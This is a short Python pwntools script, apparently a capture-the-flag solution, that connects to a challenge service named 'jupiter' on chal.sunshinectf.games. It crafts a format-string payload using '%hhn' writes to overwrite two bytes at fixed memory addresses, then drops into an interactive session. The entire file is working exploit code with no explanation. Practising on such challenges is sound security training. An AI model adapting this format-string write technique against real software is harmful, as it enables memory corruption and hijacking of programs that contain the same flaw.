#!/usr/bin/env python3
from pwn import *
exe = ELF('jupiter', checksec = False)

# p = process(exe.path)
p = remote('chal.sunshinectf.games', 25607)

# input()
payload = f'%{0x13}c%10$hhn'.encode()
payload += f'%{0x37 - 0x13}c%9$hhn'.encode()
payload = payload.ljust(0x20, b'\0')
# payload = b'%p'*16
payload += p64(0x404012) + p64(0x404013)
p.sendlineafter(b'risk: ', payload)


p.interactive()